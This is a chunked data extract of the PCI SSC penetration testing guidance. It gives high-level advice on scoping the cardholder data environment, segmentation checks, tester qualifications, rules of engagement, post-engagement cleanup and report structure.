CDE perimeter as well as critical systems within and outside of the CDE. For example, the testing may attempt to exploit permitted access paths from systems on an internal network segment into the CDE. When access to the CDE is obtained as a result of the testing, the scope of the penetration test may allow the tester to continue exploring inside the network and further the attack against other systems within the CDE, and may also include testing any data-exfiltration prevention (data-loss prevention) controls that are in place. In all cases, the scope of internal testing should consider the specific environment and the entity’s risk assessment. Entities are encouraged to consult with their assessor and the penetration tester to ensure the scope of the penetration test is sufficient and appropriate for their particular environment. 2.2.3 Testing Segmentation Controls The intent of segmentation is to prevent out-of-scope systems from being able to communicate with systems in the CDE or impact the security of the CDE. When properly implemented, a segmented (out-of- scope) system component could not impact the security of the CDE, even if an attacker obtained control of the out-of-scope system. If segmentation controls are implemented, testing of the controls is required to confirm that the segmentation methods are working as intended and that all out-of-scope systems and networks are isolated from systems in the CDE. The scope of segmentation testing should consider any networks and systems considered as being out of",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 4
    }
  },
  {
    "text": "segmentation controls are implemented, testing of the controls is required to confirm that the segmentation methods are working as intended and that all out-of-scope systems and networks are isolated from systems in the CDE. The scope of segmentation testing should consider any networks and systems considered as being out of scope for PCI DSS to verify they do not have connectivity to the CDE and cannot be used to impact the security of the CDE. The intent of this assessment is to validate the effectiveness of the segmentation controls separating the out-of-scope environments from the CDE and to ensure the controls are operating as intended. The intent of this document is to provide supplemental information. Information provided here does not 8\\n2.2.4 Critical Systems The term “critical systems” is used in PCI DSS to reference systems that are involved in the processing or protection of cardholder data. PCI DSS provides examples of critical systems that may be impacted by identified vulnerabilities including “security systems, public-facing devices and systems, databases, and other systems that store, process, or transmit cardholder data” (Requirement 6.1). However, for the purposes of a penetration test, there may be additional systems outside the CDE boundaries that could affect the security of the CDE. These systems should also be considered to be critical systems. Common examples of critical systems relevant to a penetration test might include: security systems (for example, firewalls, intrusion-detection systems/intrusion-prevention systems (IDS/IPS), authentication servers, e- commerce redirection servers, etc.), or any assets utilized by privileged users to support and manage the CDE. Please note that critical systems are defined by the entity, as each environment is different. 2.3 Application-Layer and Network-Layer Testing Any software written by or specifically for the organization that is part of the penetration test scope should be subject to both an application and network-layer penetration test. This assessment helps identify security defects that result from either insecure application design or configuration, or from employing insecure coding practices or security defects that may result from insecure implementation, configuration, usage, or maintenance of software. The remediation of vulnerabilities identified during an application-layer assessment may involve redesigning or rewriting insecure code. The remediation of vulnerabilities identified during a network-layer assessment typically involves either reconfiguring or updating software. In some instances, remediation may include deploying a secure alternative to insecure software. 2.3.1 Authentication If the application requires user authentication to the custom software, testing should be performed against all roles or types of access assumed by these parties. Also, testing should be performed against any role or access type that does not have explicit authorization to cardholder data to verify accounts without access cannot compromise such data. For customers running applications on multitenant servers that provide customers access to their cardholder data, authenticated testing should be performed to ensure customer access is properly restricted to only their own cardholder data. The customer should provide the penetration tester with credentials that have equivalent permission(s) as a customer user, to allow the penetration tester to determine whether those",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 5
    }
  },
  {
    "text": "customers access to their cardholder data, authenticated testing should be performed to ensure customer access is properly restricted to only their own cardholder data. The customer should provide the penetration tester with credentials that have equivalent permission(s) as a customer user, to allow the penetration tester to determine whether those credentials allow access to data beyond the entity’s data. 2.3.2 PA-DSS Compliant Applications If a payment application has been PA-DSS validated, the application’s functionality does not need to be tested as part of the entity’s PCI DSS compliance validation. However, the implementation of the application does need to be tested. This includes both the operating system and any exposed services, but not the payment application’s functionality (e.g., authentication, key management, transaction processing, etc.) since this was validated as part of the PA-DSS application validation. The intent of this document is to provide supplemental information. Information provided here does not 9\\n2.3.3 Web Applications It is common for an environment to host a web application that was not specifically coded for the organization such as commercial, off-the-shelf web-mail interfaces, document-sharing tools, file-transfer services, network-device administrative interfaces, etc. In these instances, the web application does not typically need an application-layer penetration test as the entity is not responsible for the source code of this type of software. Instead, the tester should perform a network-layer test and ensure the software was implemented, configured, and is currently being maintained in a secure manner (disabling or uninstalling unused services, blocking unused ports, applying current updates, etc.). 2.3.4 Separate Testing Environment Because of the nature and the intent of penetration testing, such testing in a production environment during normal business hours may impact business operations, and attempts to avoid disruption may increase the time, resources and complexity of the testing. This is especially important for high availability systems that may be impacted by penetration testing in a production environment. To avoid disruptions and to speed up testing, a separate environment that is identical to the production environment may be used for testing instead of the production environment. The penetration tester would need to ensure the same application and network-layer controls as production exist in the testing environment. This may be accomplished through methods to map out the production environment to verify it matches the testing environment. This should be included in the rules of engagement. All exploitable vulnerabilities identified during the testing must be corrected on production systems and testing repeated to verify that security weaknesses have been addressed. 2.4 Segmentation Checks PCI DSS Requirement 11.3.4 requires penetration testing to validate that segmentation controls and methods are operational, effective, and isolate all out-of-scope systems from systems in the CDE. Therefore, a robust approach to penetration testing is recommended to satisfy this requirement by actively attempting to identify routes and paths from networks outside the CDE into the CDE. All segmentation methods need to be specifically tested. In very large networks, with numerous internal LAN segments, it may be infeasible for the penetration tester to conduct specific tests",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 6
    }
  },
  {
    "text": "recommended to satisfy this requirement by actively attempting to identify routes and paths from networks outside the CDE into the CDE. All segmentation methods need to be specifically tested. In very large networks, with numerous internal LAN segments, it may be infeasible for the penetration tester to conduct specific tests from every individual LAN segment. In this case, the testing needs to be planned to examine each type of segmentation methodology in use (i.e., firewall, VLAN ACL, etc.) in order to validate the effectiveness of the segmentation controls. The level of testing for each segmentation methodology should provide assurance that the methodology is effective in all instances of use. In order to effectively validate the segmentation methodologies, it is expected that the penetration tester has worked with the organization (or the organization’s QSA) to clearly understand all methodologies in use in order to provide complete coverage when testing. The penetration tester may choose to include systems located in these isolated LAN segments not directly related to the processing, transmission, or storage of cardholder data to ensure these systems could not impact the security of the CDE if compromised. See Section 4.2.3 for specific guidance on testing methodologies for validating segmentation controls. The intent of this document is to provide supplemental information. Information provided here does not 10\\n2.5 Social Engineering Social engineering is the attempt to gain information, access, or introduce unauthorized software into the environment through the manipulation of end users. PCI DSS reconfirms testing by requiring industry accepted penetration-testing approaches (many of which include social engineering as part of their approach) and to have an approach to penetration testing that \"considers the threats and vulnerabilities experienced by merchants in the last 12 months.\" This may include social-engineering attacks as a method used for introducing malware into the environment. Social-engineering tests are an effective method of identifying risks associated with end users’ failure to follow documented policies and procedures. There is no blanket approach to social-engineering engagements. If an organization chooses to include social-engineering testing as part of its annual security review, the tests performed should be appropriate for the size and complexity of the organization and should consider the maturity of the organization’s security awareness program. These tests might include in-person, non- technological interactions such as persuading someone to hold open a door, remote interactions such as having someone provide or reset a password, or convincing the end user to open a vulnerable e-mail attachment or hyperlink. While PCI DSS does not require testing to include social-engineering techniques, an entity can incorporate it into its penetration testing methodology as an ongoing method to determine the effectiveness of the security awareness program. The frequency of social-engineering tests would be determined by the entity when establishing its security awareness program. End-user security awareness re-education might be sufficient remediation for users who fail a social-engineering test. The objective is that, over time, fewer and fewer employees are making poor decisions that could allow an attacker to compromise security. Additional guidance on establishing",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 7
    }
  },
  {
    "text": "by the entity when establishing its security awareness program. End-user security awareness re-education might be sufficient remediation for users who fail a social-engineering test. The objective is that, over time, fewer and fewer employees are making poor decisions that could allow an attacker to compromise security. Additional guidance on establishing an effective and robust security awareness program can be found in the Document Library on the PCI SSC website. Social-engineering testing may not be appropriate or provide a meaningful result for all organizations. Although social-engineering testing is not a requirement of PCI DSS, an organization may consider documenting the reason(s) for foregoing social-engineering testing and include applicable documentation with the internal and external penetration test reports, particularly if social-engineering attacks were encountered in the last 12 months. 2.6 What is considered a “significant change”? Per PCI DSS Requirements 11.3.1 and 11.3.2, penetration testing must be performed at least annually and after any significant change—for example, infrastructure or application upgrade or modification—or new system component installations. What is deemed “significant” is highly dependent an entity’s risk- assessment process and on the configuration of a given environment. Because of this variability, a significant change is not prescribed by PCI DSS. If the change could impact the security of the network or allow access to cardholder data, it may be considered significant by the entity. Penetration testing of significant changes is performed to ensure that controls assumed to be in place are still working effectively after the upgrade or modification. The intent of this document is to provide supplemental information. Information provided here does not 11\\n3 Qualifications of a Penetration Tester Qualified internal resources or a qualified third party may perform the penetration test as long as they are organizationally independent. This means the penetration tester must be organizationally separate from the management of the target systems. For example, in situations where a third-party company is performing the PCI DSS assessment for the entity, that party cannot perform the penetration test if they were involved in the installation, maintenance, or support of target systems. The following guidelines may be useful when selecting a penetration tester (or team) to understand their qualifications to perform penetration testing. 3.1 Certifications Certifications held by a penetration tester may be an indication of the skill level and competence of a potential penetration tester or company. While these are not required certifications, they can indicate a common body of knowledge held by the candidate. The following are some examples of common penetration testing certifications:  Offensive Security Certified Professional (OSCP)  Certified Ethical Hacker (CEH)  Global Information Assurance Certification (GIAC) Certifications (e.g., GIAC Certified Penetration Tester (GPEN), GIAC Web Application Penetration Tester (GWAPT), or GIAC Exploit Researcher and Advanced Penetration Tester (GXPN))  CREST Penetration Testing Certifications  Communication Electronic Security Group (CESG) IT Health Check Service (CHECK) certification Note: The PCI SSC does not validate or endorse these certifications. 3.2 Past Experience Appropriate penetration testing experience and qualifications cannot be met by certifications alone. Therefore, confirmation of",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 8
    }
  },
  {
    "text": "Advanced Penetration Tester (GXPN))  CREST Penetration Testing Certifications  Communication Electronic Security Group (CESG) IT Health Check Service (CHECK) certification Note: The PCI SSC does not validate or endorse these certifications. 3.2 Past Experience Appropriate penetration testing experience and qualifications cannot be met by certifications alone. Therefore, confirmation of additional criteria is necessary. For example, review of the extent of actual engagements that have been performed and relevant work experience are important considerations when selecting a penetration tester or team. The following questions are examples for assessing the qualifications and competency of a penetration tester or team. This is not an exhaustive list: Q How many years’ experience does the penetration tester have? • If the penetration tester is in their first year of penetration testing, careful consideration should be given to the following questions to ensure the penetration tester has sufficient knowledge and is adequately trained to perform the penetration test. Consideration should also be given to the organization itself by verifying the training and QA processes to ensure penetration tester is qualified. The intent of this document is to provide supplemental information. Information provided here does not 12\\nQ How many years has the organization that employs the penetration tester been performing penetration tests? • References from other customers may be useful in consideration. Q Has the penetration tester performed assessments against organizations of similar size and scope? • For environments with high availability constraints, unstable system components, or large infrastructures, it is important to evaluate a tester’s ability to handle those restrictions (bandwidth constraints, time constraints, etc.). Q What penetration testing experience has the penetration tester or team had with the technologies in the target environment (i.e., operating systems, hardware, web applications, highly customized applications, network services, protocols, etc.)? • When selecting a penetration tester, it is important to evaluate the past testing experience of the organization for which the tester works as it pertains to technologies specifically deployed within the target environment. • Even if the penetration tester has not performed an assessment against certain specific technologies, if the tester has managed, maintained, been trained on, or developed said technologies, the tester may still be qualified to perform the penetration test. Q Consider what other skills/qualifications the penetration tester has that will contribute to their ability to assess the environment. • Are there industry-standard penetration testing certifications held by the penetration tester? (See Section 3.1.) • What type of experience does the penetration tester have conducting network-layer penetration testing? Discussion of examples of network penetration testing efforts conducted by the organization may be warranted. • Does the penetration tester have experience conducting application-layer penetration testing? Discussion of the penetration tester’s familiarity with testing to validate the OWASP Top 10 and other similar application secure-coding standards and examples of application penetration testing efforts conducted by the organization may be warranted. Note: An organization may want to consider having a development-environment lab where penetration tests can be performed outside of the production environment and internal resources can train",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 9
    }
  },
  {
    "text": "OWASP Top 10 and other similar application secure-coding standards and examples of application penetration testing efforts conducted by the organization may be warranted. Note: An organization may want to consider having a development-environment lab where penetration tests can be performed outside of the production environment and internal resources can train and increase their experience to help both their skills and potential certifications. The intent of this document is to provide supplemental information. Information provided here does not 13\\n4 Methodology To ensure a successful penetration test, there are several activities and processes to be considered beyond the testing itself. This section provides guidance for these activities and is organized by the typical phases that occur during a penetration test: pre-engagement, engagement, and post-engagement. 4.1 Pre-Engagement Before the engagement or testing begins, it is recommended that all parties involved (the organization, the tester, and where applicable, the assessor) be informed of the types of testing (i.e., internal, external, application-layer or network-layer) to be performed, how testing will be performed, and what the testing will target. By coordinating these details first, issues where the CDE scope is defined improperly or other issues arise that would require a retest might be avoided. This information may be gathered by conducting a pre- engagement call or during an on-site pre-engagement meeting. 4.1.1 Scoping The organization being assessed is responsible for defining the CDE and any critical systems. It is recommended that the organization work with the tester and, where applicable, the assessor to verify that no components are overlooked and to determine whether any additional systems should be included in scope. The scope of the penetration test should be representative of all access points, critical systems, and segmentation methodologies for the CDE. 4.1.2 Documentation Whenever possible, detailed documentation of any components within the scope should be made available to the tester. Common examples of such documents are application-interface documentation and implementation guides. This information will ensure the tester understands how functionality should work and whether results received are expected for the given scenario. As a part of the scoping process, the organization should consider supplying the tester with the following documentation:  A network diagram depicting all network segments in scope for the test (Refer to PCI DSS Requirements 1.1.2 and 1.1.3.)  Cardholder data flow diagram  A list of all expected services and ports exposed at the CDE perimeter  Details of how authorized users access the CDE  A list of all network segments that have been isolated from the CDE to reduce scope The penetration tester will use this information during the assessment to identify unexpected attack vectors of the CDE in addition to known attack vectors, insufficient authentication controls, and to confirm the proper segmentation of out-of-scope environments. The intent of this document is to provide supplemental information. Information provided here does not 14\\n4.1.3 Rules of Engagement Prior to the commencement of any testing, it is important to document and agree upon the conditions in which testing is to be performed",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 10
    }
  },
  {
    "text": "confirm the proper segmentation of out-of-scope environments. The intent of this document is to provide supplemental information. Information provided here does not 14\\n4.1.3 Rules of Engagement Prior to the commencement of any testing, it is important to document and agree upon the conditions in which testing is to be performed and the degree of exploitation, if any, that is permitted. This authorizes the tester to test the environment and ensure the organization understands what to expect from the penetration test. Below are some examples of considerations that may be included in the rules of engagement:  During what time window will testing need to be performed?  Are there any legacy systems that have known issues with automated scanning? If so, how should testing be performed against these systems?  Is there a preferred method of communicating about scope and issues encountered during the engagement?  Does the entity want updates regarding ongoing exploitation of systems during the test? If so, the entity will need to determine whether they will or will not act upon such information or make changes to the environment. The entity may also want to implement its incident response plan in response to an exploit.  Are there security controls that would detect or prevent testing? Consider whether these should be disabled or configured to not interfere during testing. (See Section 4.1.7 for further guidance.)  If passwords or other sensitive data are compromised during the testing, does the tester need to disclose a list of all passwords and/or sensitive data accessed?  If equipment owned by the tester is to be connected to the organization’s network, what steps must be taken to ensure the equipment does not pose a threat to the environment (updated to the latest operating system, applied service packs and/or patches, etc.)?  Does the tester need to provide all IP addresses from which testing will originate?  Will sensitive data shown to be accessible during the test be retained by the tester during and after the penetration test? Only a proof-of-concept test should be performed, any cardholder data obtained must be secured in accordance with PCI DSS. (See Section 4.2.4 for more guidance.)  What steps will be taken if the tester detects a previous or active compromise to systems being tested? (For example, activate incident response procedures and stop penetration test until resolution of the compromise situation.) The intent of this document is to provide supplemental information. Information provided here does not 15\\n4.1.4 Third-Party-Hosted / Cloud Environments Below are examples of considerations that may be included in the rules of engagement for third-party- hosted/cloud environments of the entity:  If a service-level agreement requires approval from a third party before penetration tests can be conducted, the organization must receive approval from the third party (i.e., hosting provider, etc.) before the assessment is to take place.  The scope may not include the infrastructure provided by the third party to the entity. The scope may include any systems managed, built, or",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 11
    }
  },
  {
    "text": "penetration tests can be conducted, the organization must receive approval from the third party (i.e., hosting provider, etc.) before the assessment is to take place.  The scope may not include the infrastructure provided by the third party to the entity. The scope may include any systems managed, built, or utilized by the organization.  Unless otherwise noted in the scope, web-management portals provided by the third party for the entity to manage its infrastructure should not be included in the penetration test—these interfaces should be tested and validated as part of the third party’s PCI DSS compliance efforts, and evidence or attestation of validation should be provided to the customer. 4.1.5 Success Criteria The intent of a penetration test is to simulate a real-world attack situation with a goal of identifying how far an attacker may be able to penetrate into the environment. Defining the success criteria for the penetration test allows the entity to set limits on the depth of the penetration test. Without agreeing upon the point at which the penetration test is complete, there is a possibility of the tester exceeding the boundaries and expectations of the target entity. This should be documented in the rules of engagement. Possible success criteria may include:  Direct observation of restricted services or data in the absence of expected access controls  Compromise of an intermediary device used by privileged users to access the CDE  Compromise of the domain used by privileged users  No compromise of the target systems The success criteria will be different for every environment and should be established during initial pre- engagement meeting prior to testing. 4.1.6 Review of Past Threats and Vulnerabilities PCI DSS Requirement 11.3 requires a review and consideration of threats and vulnerabilities encountered by the assessed entity within the past 12 months. This is an historical look at real vulnerabilities experienced or discovered in the entity’s environment since the last assessment. This information may provide insight to the process in place to handle these vulnerabilities. The intent of this document is to provide supplemental information. Information provided here does not 16\\nThe penetration tester should be familiar with current vulnerabilities seen by the industry over the past 12 months as well as take a detailed look at recent vulnerabilities experienced by the entity. Depending on the type of test to be performed (i.e., white box, grey box, black box), the following may or may not be considered in such a review:  Vulnerabilities discovered by the entity which have not been remediated within the time period required by PCI DSS (example: quarterly), and/or by the vulnerability remediation requirements documented in the corporate security policy  Existing compensating controls mitigating the noted vulnerabilities  Deployments or upgrades in progress (consider both hardware and software)  If applicable, threats or vulnerabilities that may have led to a data breach  Validation of the remediation of previous years’ penetration test findings  Identification of industry “state of existing vulnerabilities” for purposes of tracking",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 12
    }
  },
  {
    "text": "noted vulnerabilities  Deployments or upgrades in progress (consider both hardware and software)  If applicable, threats or vulnerabilities that may have led to a data breach  Validation of the remediation of previous years’ penetration test findings  Identification of industry “state of existing vulnerabilities” for purposes of tracking vulnerabilities that may have not been detected at the time of the most recent penetration test The tester may gain additional insight of the target environment for this review by:  Reviewing prior penetration test reports  Reviewing previously issued Reports on Compliance or Attestations of Compliance  Reviewing current vulnerability scan test results 4.1.7 Avoid scan interference on security appliances. In many environments, active protection controls such as an intrusion prevention system or web active protection systems such as intrusion protection systems (IPS) and web application firewalls (WAF) may be deployed to protect exposed services. Because the intent of the penetration test is to evaluate the services’ susceptibility to exploitation (vs. the active protection systems’ ability to prevent attacks), interference with the penetration test should be avoided—entities are encouraged to review and be familiar with the section titled “Scan Interference” in the ASV Program Guide and configure active protection systems accordingly during testing. This practice helps ensure that the services themselves are configured properly and have the minimal risk of being exploited in the event the active protection system fails or is somehow defeated or bypassed by an attacker. 4.2 Engagement: Penetration Testing Each environment has unique aspects/technology that requires the tester select the most appropriate approach and the tools necessary to perform the penetration test. It is beyond the scope of this document to define or outline which approach, tools, or techniques are appropriate for each penetration test. Instead, the following sections provide high-level guidance on considerations for the approach, tools, or techniques. The intent of this document is to provide supplemental information. Information provided here does not 17\\nPenetration testing is essentially a manual endeavor. In many cases, tools exist that can aid the tester in performing the test and alleviate some of the repetitive tasks. Judgment is required in selecting the appropriate tools and in identifying attack vectors that typically cannot be identified through automated means. Penetration testing should also be performed from a suitable location, with no restrictions on ports or services by the Internet provider. For example, a penetration tester utilizing Internet connectivity provided to consumers and residences may have SMTP, SNMP, SMB, and other ports restricted by the Internet provider to minimize impact by viruses and malware. If testing is performed by a qualified internal resource, the test should also be performed from a neutral Internet connection unaffected by access controls that might be present from the corporate or support environments. 4.2.1 Application Layer As mentioned in Section 2.3, the penetration tester should perform testing from the perspective of the defined roles of the application. The organization is strongly encouraged to supply credentials to allow the tester to assume the required roles. This will",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 13
    }
  },
  {
    "text": "present from the corporate or support environments. 4.2.1 Application Layer As mentioned in Section 2.3, the penetration tester should perform testing from the perspective of the defined roles of the application. The organization is strongly encouraged to supply credentials to allow the tester to assume the required roles. This will allow the tester to determine if, at any given role, the user could escalate privileges or otherwise gain access to data they are not explicitly allowed to access. In instances where the organization has created new accounts for the tester to use, it is important that the organization ensure all roles and applicable security in the application have been set up to allow the tester to effectively test all functionality. In instances where a web application utilizes a back-end API, the API may be in scope for the testing. The tester should understand the interaction between the web application and the backend, the functionality exposed by the API, as well as any security controls implemented to protect access to the API. Those, and other factors, will help determine whether the back-end API should be tested independently from the web application. 4.2.2 Network Layer Since most protocols are well defined and have standard modes of interaction, network-layer testing is more suitable for automated testing. This makes automation the first logical step in a network-layer test. Because of such standardization, tools may be used to quickly identify a service, the version of the software, test for common misconfigurations, and even identify vulnerabilities. Automated tests can be performed much faster than could be expected of a human. However, simply running an automated tool does not satisfy the penetration testing requirement. Automated tools cannot interpret vulnerabilities, misconfigurations, or even the services exposed to assess the true risk to the environment. The automated tool only serves as a baseline indication of the potential attack surface of the environment. The penetration tester must interpret the results of any automated tools and determine whether additional testing is needed. Using the documentation provided by the organization during the pre-engagement, the tester should:  Verify that only authorized services are exposed at the CDE perimeter.  Attempt to bypass authentication controls from all network segments where authorized users access the CDE, as well as segments not authorized to access the CDE. The intent of this document is to provide supplemental information. Information provided here does not 18\\n4.2.3 Segmentation The segmentation check is performed by conducting tests used in the initial stages of a network penetration test (i.e., host discovery, port scanning, etc.). It should verify that all out-of-scope LANs truly have no access to the CDE. For environments with a large number of network segments considered to be out of scope or isolated from the CDE, a representative subset can be used for testing to reduce the number of segmentation checks that need to be performed. Each unique segmentation methodology should be tested to ensure that all security controls are functioning as intended. If it is determined during the",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 14
    }
  },
  {
    "text": "of scope or isolated from the CDE, a representative subset can be used for testing to reduce the number of segmentation checks that need to be performed. Each unique segmentation methodology should be tested to ensure that all security controls are functioning as intended. If it is determined during the segmentation check that a LAN segment thought to be out of scope has access into the CDE, the organization will either need to adjust the segmentation controls to block that access, or perform a full network-layer penetration test to characterize the access and the impact on PCI DSS scope. 4.2.4 What to do when cardholder data is encountered If cardholder data is accessed during the penetration test, it is important that the tester notify the organization immediately. The tester should keep detailed documentation as to exactly what data was accessed and how it was accessed. After being notified, the organization should immediately review how the cardholder data was retrieved and, as appropriate, should take steps to execute its incident response plan. If the output of testing tools or activities includes cardholder data that was accessed by the tester during the engagement, it is important this output be secured in accordance with PCI DSS. 4.2.5 Post-Exploitation The term “post-exploitation” refers to the actions taken after the initial compromise of a system or device. It often describes the methodical approach of using privilege escalation or pivoting techniques—which allows the tester, in this case, to establish a new source of attack from the new vantage point in the system—to gain additional access to systems or network resources. Penetration testers should be able to demonstrate the risk presented by exploitable systems to the CDE and what post-exploitation may likely occur with those systems. 4.3 Post-Engagement After the engagement or testing has been performed, there are activities both parties should carry out. 4.3.1 Remediation Best Practices Penetration testing efforts, while thorough, may not always guarantee exhaustive identification of every instance where a security control’s effectiveness is insufficient—e.g., finding a cross site scripting vulnerability in one area of an application may not reveal all instances of this vulnerability in the application. Often the presence of vulnerability in one area may indicate weakness in process or development practices that could have replicated or enabled similar vulnerability in other locations. Therefore, it is important for the tested entity to carefully investigate systems or applications with the ineffective security controls in mind when remediating. The intent of this document is to provide supplemental information. Information provided here does not 19\\n4.3.2 Retesting Identified Vulnerabilities The organization should take steps to remediate any exploitable vulnerability within a reasonable period of time after the original test. When the organization has completed these steps, the tester should perform a retest to validate the newly implemented controls mitigate the original risk. Remediation efforts extending for a long period after the initial test may require a new testing engagement to be performed to ensure accurate results of the most current environment are reported. This determination",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 15
    }
  },
  {
    "text": "steps, the tester should perform a retest to validate the newly implemented controls mitigate the original risk. Remediation efforts extending for a long period after the initial test may require a new testing engagement to be performed to ensure accurate results of the most current environment are reported. This determination may be made after a risk analysis of how much change has occurred since the original testing was completed. In specific conditions, the flagged security issue may represent a fundamental flaw in an environment or application. The scope of a retest should consider whether any changes occurring as a result of remediation identified from the test are classified as significant. All changes should be retested; however, whether a complete system retest is necessary will be determined by the risk assessment of those changes. 4.3.3 Cleaning up the Environment It is important for the tester to document and disclose to the organization any alterations made to the environment (as permitted in the Rules of Engagement) during the test, including but not limited to:  Accounts that were created as a part of the assessment either by the entity or the tester: the organization should then remove these accounts.  Tools installed by the tester on the organization’s systems: these tools should be removed at the end of the testing. Removal of accounts and test tools will ensure the accounts or remnant tools could not be exploited or used against the organization. 4.4 Additional Resources There are multiple industry-accepted methodologies that may provide additional guidance on penetration testing activities, including but not limited to:  Open Source Security Testing Methodology Manual (“OSSTMM”)  The National Institute of Standards and Technology (“NIST”) Special Publication 800-115  OWASP Testing Guide  Penetration Testing Execution Standard  Penetration Testing Framework The intent of this document is to provide supplemental information. Information provided here does not 20\\n5 Reporting and Documentation The purpose of the report is to assist the organization in its efforts to improve its security posture by identifying areas of potential risk that may need to be remediated. Merely reporting lists of vulnerabilities is not helpful in this endeavor and does not meet the intent of the penetration test. The report should be structured in a way to clearly communicate what was tested, how it was tested, and the results of the testing. This section provides guidance on documenting identified and/or exploited vulnerabilities, creating reporting templates, and evaluating a penetration test report. 5.1 Identified Vulnerability Reporting Penetration test reports should include a discussion of the steps, vectors, and exploited vulnerabilities that lead to penetration during testing for which remediation and retesting are required. However, it is possible for the tester to identify vulnerabilities that were not necessarily exploitable but which are deemed to pose a potential risk to the environment. It is recommended that the report contain any findings that impact the security posture of the assessed entity even in cases where exploitation did not occur. Some examples of identified vulnerabilities that were not",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 16
    }
  },
  {
    "text": "were not necessarily exploitable but which are deemed to pose a potential risk to the environment. It is recommended that the report contain any findings that impact the security posture of the assessed entity even in cases where exploitation did not occur. Some examples of identified vulnerabilities that were not exploited for valid reasons and should be included in the report may be:  Firewall misconfigurations that permit unauthorized traffic between secure and insecure zones  Detection of credentials obtained through manipulation of a web-application error message that was not flagged during an ASV scan due to a low CVSS base score 5.1.1 Assigning a Severity Score In order to prioritize remediation of the penetration test findings, it is a common practice during the reporting phase for a severity or risk ranking to be assigned for each detected security issue. The report should clearly document how the severity/risk ranking is derived. In most cases, severity/risk ranking may be applied as a result of evaluating an industry-standard score (e.g., NVD, CVSS) against a threshold or value that indicates risk (i.e., high, medium, and low). However, it should be noted that it is possible for a vulnerability to exist that is inherent to a particular environment; therefore, a standardized score is not available. When custom scoring is part of the risk-ranking process, the report should reflect a traceable set of reasoning for the modification of industry-standard scores or, where applicable, for the creation of a score for a vulnerability that does not have an industry-standard score defined. The intent of this document is to provide supplemental information. Information provided here does not 21\\n5.1.2 Industry Standard References Some well-known, industry-standard references include:  National Vulnerability Database (NVD)  Common Vulnerability Scoring System (CVSS)  Common Vulnerabilities and Exposure (CVE)  Common Weakness Enumeration (CWE)  Bugtraq ID (BID)  Open Source Vulnerability Database (OSVDB) The Common Vulnerability Scoring System (CVSS) is an example of an open framework that may be referenced for assigning a baseline risk rating. The CVSS is the required scoring system for Approved Scanning Vendors (ASVs) to use for ranking vulnerabilities detected during PCI vulnerability scans. Using this system, a standardized vulnerability score can be adjusted through the evaluation of the traits of vulnerability within the context of a specific environment. 5.2 Reporting Guidelines Comprehensive and consistent reporting is a critical phase of a penetration test. This section provides guidelines on common contents of an industry standard penetration test. It should be noted that these are only suggested outlines and do not define specific reporting requirements for PCI DSS penetration tests. Testers may have different sections, alternative titles, and/or report format, etc.; this outline represents data gathered from a number of penetration testing providers and the desires of customers. 5.2.1 Penetration Test Report Outline  Executive Summary Brief high-level summary of the penetration test scope and major findings o  Statement of Scope A detailed definition of the scope of the network and systems tested as part of o the",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 17
    }
  },
  {
    "text": "of penetration testing providers and the desires of customers. 5.2.1 Penetration Test Report Outline  Executive Summary Brief high-level summary of the penetration test scope and major findings o  Statement of Scope A detailed definition of the scope of the network and systems tested as part of o the engagement Clarification of CDE vs. non-CDE systems or segments that are considered during the test o Identification of critical systems in or out of the CDE and explanation of why they are o included in the test as targets  Statement of Methodology Details on the methodologies used to complete the testing (port scanning, nmap etc.). o See Section 4 for details on methodologies that should be documented.  Statement of Limitations Document any restrictions imposed on testing such as designated testing hours, o bandwidth restrictions, special testing requirements for legacy systems, etc. The intent of this document is to provide supplemental information. Information provided here does not 22\\n Testing Narrative Provide details as to the testing methodology and how testing progressed. For example, if o the environment did not have any active services, explain what testing was performed to verify restricted access. Document any issues encountered during testing (e.g., interference was encountered o as a result of active protection systems blocking traffic).  Segmentation Test Results Summarize the testing performed to validate segmentation controls, if used to reduce o the scope of PCI DSS.  Findings Whether/how the CDE may be exploited using each vulnerability. o Risk ranking/severity of each vulnerability o Targets affected o References (if available) o CVE, CWE, BID, OSBDB, etc. - Vendor and/or researcher - Description of finding o  Tools Used  Cleaning up the Environment Post-Penetration Test After testing there may be tasks the tester or customer needs to perform to restore the target environment (i.e., update/removal of test accounts or database entries added or modified during testing, uninstall of test tools or other artifacts, restoring active protection-system settings, and/or other activities the tester may not have permissions to perform, etc.). Provide directions on how cleanup should be performed and how to verify security o controls have been restored. 5.2.2 Retesting Considerations and Report Outline If the noted findings will require remediation and retesting before an assessor can determine the entity has met PCI DSS Requirement 11.3, a follow-up test report may be provided. All remediation efforts should be completed and retested within a reasonable period of time after the original penetration test report was provided. It is expected that the remediation test report will cover all identified/exploitable vulnerabilities that require remediation. Those identified vulnerabilities is may be medium or high for external penetration tests and those defined by the organization as medium or high for internal tests. The intent of this document is to provide supplemental information. Information provided here does not 23\\nThe following is an example of the sections to include in a retest report as defined in Section 5.2.1:  Executive Summary  Date of Original Test  Date of",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 18
    }
  },
  {
